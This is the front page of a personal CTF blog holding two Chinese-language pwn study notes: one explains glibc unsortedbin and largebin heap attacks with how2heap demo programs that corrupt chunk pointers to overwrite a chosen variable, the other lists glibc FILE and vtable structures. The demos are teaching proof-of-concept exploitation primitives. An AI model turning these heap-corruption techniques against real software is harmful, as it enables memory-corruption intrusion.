
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Masco&#39;s blog</title>
    <meta name="author" content="Masco" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/background3.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  

  <canvas
    id="fireworks"
    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
></canvas>
<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
<script src="/js/fireworks.min.js"></script>

    <canvas
    id="background"
    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"
></canvas>
<script src="/js/background.min.js"></script>


    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>fufufufu~</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>MASCO&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;MASCO&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div
        id="home-background"
        ref="homeBackground"
        data-images="/images/background1.jpg,/images/background2.jpg,/images/background3.jpg,/images/background4.jpg"
    ></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Masco&#39;s blog</h1>
                <h3></h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div
    id="home-posts-wrap"
    ref="homePostsWrap"
    true
>
    <div id="home-posts">
        

<div class="post">
    <a href="/2024/07/18/bin/">
        <h2 class="post-title">bin</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/7/18
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <hr>
<h1 id="堆中bin的利用"><a href="#堆中bin的利用" class="headerlink" title="堆中bin的利用"></a>堆中bin的利用</h1><h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><h2 id="tachebin-attack"><a href="#tachebin-attack" class="headerlink" title="tachebin attack"></a>tachebin attack</h2><h2 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h2><p>作用：将P-&gt;bk-&gt;fd赋值为P-&gt;fd。</p>
<p>1、首先是unsortedbin 的分配机制，超出了fastbin和tachebin范围的free chunk就会进入unsortedbin中，并且unsortedbin是先从末尾取出chunk进行分配的，后free的chunk会进入先free的chunk的前面。unsortedbin顾名思义，未分类的chunk，所以只要用户重新申请了chunk，unsortedbin中的chunk就会被重新分类，按照其chunk的大小分别进入smallbin、largebin…中。</p>
<p>2、unsortedbin的利用。主要就是利用其中的bk指针</p>
<pre><code>//bck是倒数第二个chunk，victim里存的是倒数第一个chunk
/* remove from unsorted list *   
if (__glibc_unlikely (bck-&gt;fd != victim))
        malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
unsorted_chunks (av)-&gt;bk = bck;
bck-&gt;fd = unsorted_chunks (av);
</code></pre>
<p>如上所示，里面没有涉及到victim的fd指针，只有其bk以及bck的fd。所以主要利用也是从victim的bk入手，修改其bk为一个我们已知的地址，这样bck就变成了我们的fake_chunk。victim的bk就会指向fake_chunk-0x10的位置。所以当我们重新启用victim时也就是对其malloc时。<br>则fake_chunk-0x10的fd就会指向unsortbin。<br>不过由于我们突然插入的chunk，后续的unsortbin在进行分配时可能会出现问题。</p>
<p>测试案例</p>
<pre><code>How2heap(使用 gcc -g 进行编译)
1 //gcc hollk.c -g -no-pie -o hollk
2 #include &lt;stdio.h&gt;
3 #include &lt;stdlib.h&gt;
4
5 int main() &#123;
6
7   unsigned long target_var = 0;
8   fprintf(stderr,&quot;&amp;target_var and target_var:\n&quot;);
9   fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;target_var, target_var);
10
11   unsigned long *p = malloc(400);
12   fprintf(stderr, &quot;The first chunk_addr at: %p\n&quot;,p);
13
14   malloc(500);
15
16   free(p);
17   fprintf(stderr, &quot;The first chunk_bk is %p\n&quot;,(void *)p[1]);
18
19   p[1] = (unsigned long)(&amp;target_var - 2);
20   fprintf(stderr, &quot;Now,The first chunk_bk is %p\n\n&quot;, (void *)p[1]);
21
22   malloc(400);
23   fprintf(stderr, &quot;target has been rewrite %p: %p\n&quot;, &amp;target_var, (void *)target_var);
24 &#125;
</code></pre>
<h2 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h2><p>(总的来说，利用方法与unsortedbin差不多，并且其中的利用效果都一样，只是largebin除了可以利用bk还可以利用bk_nextsize）</p>
<p>1、规则<br>（1）、共有63个bins，每个bin的size域值各不相同，但是公差是一致的。（大于0x3F0的chunk在遍历后进入largebin，反之小于的则进入到smallbin）<br>（2）、由大到小进行存储，若大小一致则按照时间顺序存储。（小的chunk链接到largebin）</p>
<p>2、新增fd_nextsize与bk_nextsize这两指针。fd_nextsize的作用是记录前面第一个与此chunk的size不同的chunk的地址，而bk_nextsize则是记录后面第一个与此chunk的size不同的chunk的地址。（只有第一个chunk的fd&#x2F;bk_nextsize进行记录，其他的默认为0）</p>
<p>3、attack<br>已知largebin对chunk进行操作有三种情况<br>（进行伪造工作的chunk是chunk_B又名P2，chunk_A是P3其size大于P2）</p>
<p>（1）、chunk_A大于chunk_B</p>
<p>（2）、chunk_A小于chunk_B</p>
<p>（3）、chunk_A等于chunk_B</p>
<p>又得知，largbin是按chunk由大到小进行排列的，小的那一方chunk靠近largebin<br>(1)、<br><img src="/images/u1.png" alt="图片"><br>又又得知，对chunk进行操作的三种情况</p>
<p>（其中chunk_A是P3，chunk_B是P2，p2-&gt;bk是value1-0x10，p2-&gt;bk_nextsize是value2-0x20）<br>（2）、<br><img src="/images/u2.png" alt="图片"><br>（3）、<br><img src="/images/u3.png" alt="图片"></p>
<p>另外需要注意，伪造的堆块fd_nextsize需要设置为0.不然无法通过以下unlink检查。<br>    size &#x3D; chunksize (victim);</p>
<pre><code>/*  We know the first chunk in this bin is big enough to use. */
assert ((unsigned long) (size) &gt;= (unsigned long) (nb));

remainder_size = size - nb;

/* unlink */
unlink_chunk (av, victim);
</code></pre>
<p>测试案例（how2heap gcc-g 编译）  </p>
<pre><code>// gcc -g 
2 #include &lt;stdio.h&gt;
3 #include &lt;stdlib.h&gt;
4
5 int main()
6 &#123;
7
8     unsigned long stack_var1 = 0;
9     unsigned long stack_var2 = 0;
10
11     fprintf(stderr, &quot;stack_var1 (%p): %ld\n&quot;, &amp;stack_var1, stack_var1);
12     fprintf(stderr, &quot;stack_var2 (%p): %ld\n\n&quot;, &amp;stack_var2, stack_var2);
13
14     unsigned long *p1 = malloc(0x320);
15     malloc(0x20);
16     unsigned long *p2 = malloc(0x400);
17     malloc(0x20);
18     unsigned long p3 = malloc(0x400);
19     malloc(0x20);
20
21     free(p1);
22     free(p2);
23
* 24     void* p4 = malloc(0x90);
25
26     free(p3);
27
28     p2[-1] = 0x3f1;
29     p2[0] = 0;
30     p2[2] = 0;
31     p2[1] = (unsigned long)(&amp;stack_var1 - 2);
32     p2[3] = (unsigned long)(&amp;stack_var2 - 4);
33
34     malloc(0x90);
35
36     fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1);
37     fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);
38
39     return 0;
40 &#125;
</code></pre>
<hr>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/07/18/bin/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/07/18/IO/">
        <h2 class="post-title">IO</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/7/18
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <hr>
<h1 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a><strong>IO结构体</strong></h1><p>关于IO_file_jumps中函数的具体作用可以参考以下两个博客<br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">国资</a>                                                              和<a target="_blank" rel="noopener" href="https://ray-cp.github.io/">ray-cp</a>   或者星盟的也可以</p>
<h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="IO_FILE_plus"></a>IO_FILE_plus</h2><pre><code>    struct _IO_FILE_plus
    &#123;
    _IO_FILE file;
    const struct _IO_jump_t *vtable;
    &#125;;
    IO_FILE(结构体）
    - struct _IO_FILE &#123;
    int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
    #define _IO_file_flags _flags

char_IO_read_ptr;   /* Current read pointer */ 
char_IO_read_end;   /* End of get area. */
char_IO_read_base;  /* Start of putback+get area. */
- //read ptr是现在read指针指向的位置，end则是read读取结束的位置，base则是开始的位置
- 

char_IO_write_base; /* Start of put area. */
char_IO_write_ptr;  /* Current put pointer. */
char_IO_write_end;  /* End of put area. */
//write的指针的作用是与read指针的作用是一致的

char_IO_buf_base;   /* Start of reserve area. */
char_IO_buf_end;    /* End of reserve area. */
//缓冲区的位置


/* The following fields are used to support backing up and undo. */
char *_IO_save_base; /* Pointer to start of non-current get area. */
char *_IO_backup_base;  /* Pointer to first valid character of backup area */
char *_IO_save_end; /* Pointer to end of non-current get area. */

struct _IO_marker *_markers;

struct _IO_FILE *_chain;
//chain依次链接的是stdin、stdout、stderr

int _fileno;
//一般指的是目前是在哪个chain里，0是in，1是out，2是err

#if 0
int _blksize;
#else
int _flags2;
#endif
_IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */

#define __HAVE_COLUMN /* temporary */
/* 1+column number of pbase(); 0 is unknown. */
unsigned short _cur_column;
signed char _vtable_offset;
char _shortbuf[1];

/*  char* _save_gptr;  char* _save_egptr; */

_IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
&#125;;
</code></pre>
<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><pre><code>struct _IO_jump_t
&#123;
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
&#125;;
</code></pre>
<h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="IO_str_jumps"></a>IO_str_jumps</h2><pre><code>1. // libio/strops.c
2. 
3. const struct _IO_jump_t _IO_str_jumps libio_vtable =
4. &#123;
5.   JUMP_INIT_DUMMY,
6.   JUMP_INIT(finish, _IO_str_finish),
7.   JUMP_INIT(overflow, _IO_str_overflow),
8.   JUMP_INIT(underflow, _IO_str_underflow),
9.   JUMP_INIT(uflow, _IO_default_uflow),
10.   JUMP_INIT(pbackfail, _IO_str_pbackfail),
11.   JUMP_INIT(xsputn, _IO_default_xsputn),
12.   JUMP_INIT(xsgetn, _IO_default_xsgetn),
13.   JUMP_INIT(seekoff, _IO_str_seekoff),
14.   JUMP_INIT(seekpos, _IO_default_seekpos),
15.   JUMP_INIT(setbuf, _IO_default_setbuf),
16.   JUMP_INIT(sync, _IO_default_sync),
17.   JUMP_INIT(doallocate, _IO_default_doallocate),
18.   JUMP_INIT(read, _IO_default_read),
19.   JUMP_INIT(write, _IO_default_write),
20.   JUMP_INIT(seek, _IO_default_seek),
21.   JUMP_INIT(close, _IO_default_close),
22.   JUMP_INIT(stat, _IO_default_stat),
23.   JUMP_INIT(showmanyc, _IO_default_showmanyc),
24.   JUMP_INIT(imbue, _IO_default_imbue)
25. &#125;;

                                                                                                                                                                        
                                                                                
                                                                                         
                                                                 
</code></pre>
<h2 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="IO_file_jumps"></a>IO_file_jumps</h2><pre><code>&#123;
__dummy = 0,
__dummy2 = 0,
__finish = 0x7ffff7c91a30 &lt;_IO_new_file_finish&gt;,
__overflow = 0x7ffff7c92de0 &lt;_IO_new_file_overflow&gt;,
__underflow = 0x7ffff7c92630 &lt;_IO_new_file_underflow&gt;,
__uflow = 0x7ffff7c95590 &lt;__GI__IO_default_uflow&gt;,
__pbackfail = 0x7ffff7c96dd0 &lt;__GI__IO_default_pbackfail&gt;,
__xsputn = 0x7ffff7c939d0 &lt;_IO_new_file_xsputn&gt;,
__xsgetn = 0x7ffff7c93d10 &lt;__GI__IO_file_xsgetn&gt;,
__seekoff = 0x7ffff7c93150 &lt;_IO_new_file_seekoff&gt;,
__seekpos = 0x7ffff7c95cb0 &lt;_IO_default_seekpos&gt;,
__setbuf = 0x7ffff7c923f0 &lt;_IO_new_file_setbuf&gt;,
__sync = 0x7ffff7c93000 &lt;_IO_new_file_sync&gt;,
__doallocate = 0x7ffff7c85110 &lt;__GI__IO_file_doallocate&gt;,
__read = 0x7ffff7c938a0 &lt;__GI__IO_file_read&gt;,
__write = 0x7ffff7c93930 &lt;_IO_new_file_write&gt;,
__seek = 0x7ffff7c938c0 &lt;__GI__IO_file_seek&gt;,
__close = 0x7ffff7c93920 &lt;__GI__IO_file_close&gt;,
__stat = 0x7ffff7c938d0 &lt;__GI__IO_file_stat&gt;,
__showmanyc = 0x7ffff7c96f80 &lt;_IO_default_showmanyc&gt;,
__imbue = 0x7ffff7c96f90 &lt;_IO_default_imbue&gt;
&#125;
</code></pre>
<hr>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/pwn/" style="color: #ffa2c4">pwn</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/IO/" style="color: #00a596">IO</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/ctf/" style="color: #00bcd4">ctf</a>
        </span>
        
    </div>
    <a href="/2024/07/18/IO/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <span class="current">1</span>
    
    
    
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/background3.jpg" alt="avatar" />
        </div>
        <div class="name">Masco</div>
        <div class="description">
            <p>shit<br>…</p>

        </div>
        
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2024 - 2024 Masco&#39;s blog
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Masco
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
</body>
</html>